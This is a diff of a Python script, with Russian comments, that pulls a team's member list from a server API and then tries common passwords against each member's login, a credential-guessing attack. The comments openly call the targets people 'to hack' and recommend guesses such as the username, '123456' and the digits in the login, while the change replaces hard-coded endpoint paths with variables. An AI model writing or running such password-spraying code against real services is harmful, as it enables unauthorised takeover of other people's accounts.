@@ -39,7 +39,7 @@ def start(passwords):
     # Получаем список людей для взлома
     # Это может занять некоторое время
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
-    r_m = requests.get(f'https://{SERVER}/api/team/' + team + '/users')
+    r_m = requests.get(f'https://{SERVER}/api/{TEAM}/' + team + f'/{USERS}')
     users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
@@ -62,7 +62,7 @@ def start(passwords):
         #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
         #   Писать сразу больше двух паролей не рекомендуется
         for password in passwords:
-            r = requests.post(f"https://{SERVER}/login",
+            r = requests.post(f"https://{SERVER}/{LOGIN}",
                               data={"username": username, "password": password.strip(), "remember": "true"},
                               headers={"X-Requested-With": "XMLHttpRequest",
                                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}) # пытаемся войти в акк
